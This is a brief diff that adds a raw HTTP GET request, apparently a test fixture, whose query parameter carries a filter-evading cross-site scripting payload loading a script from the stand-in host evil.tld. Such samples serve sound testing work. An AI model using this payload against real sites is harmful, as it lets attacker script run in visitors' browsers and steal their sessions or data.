@@ -1,0 +1,4 @@
+GET /a?input=<script%09src%3D//evil.tld/x.js></script> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
